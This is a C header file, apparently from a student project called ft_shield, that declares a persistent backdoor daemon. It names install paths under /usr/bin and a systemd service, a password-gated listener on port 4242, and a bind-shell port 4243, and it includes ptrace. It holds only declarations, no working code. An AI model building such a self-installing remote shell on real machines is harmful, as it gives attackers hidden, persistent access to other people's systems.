#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <sys/sendfile.h>
#include <sys/file.h>
#include <poll.h>
#include <stdio.h>
#include <stdbool.h>
#include <sys/signalfd.h>
#include <signal.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <sys/ptrace.h>

#define LOCK_FILE "/var/lock/ft_shield.lock"
#define TARGET_PATH "/usr/bin/ft_shield"
#define SERVICE_PATH "/etc/systemd/system/ft_shield.service"
#define MAX_CLIENTS 3
#define PORT 4242
#define BUFFER_SIZE 1024
#define SHELL_PORT "4243"

typedef struct s_client
{
	bool logged;
} t_client;

typedef struct s_server
{
	int server_socket;
	int connected_clients;
	t_client clients[MAX_CLIENTS + 1];
	struct pollfd pfds[MAX_CLIENTS + 1];
} t_server;

/*
	DAEMON
*/

int		check_lock_file(void);
void	remove_lock_file(int fd);
void	daemonize(void);

/*
	SERVER
*/

void	server(void);
void	remove_client(t_server *server, int client_fd);
void	send_to_client(t_server* server, int client_fd, char* buffer);

/*
	PASSWORD
*/
void hash_sha256(const char *str, unsigned char outputBuffer[SHA256_DIGEST_LENGTH]);
int check_password(unsigned char *hash1);

/*
	COMMANDS
*/
void handle_command(t_server* server, int client_fd, char* buffer);

/*
	BIND SHELL
*/
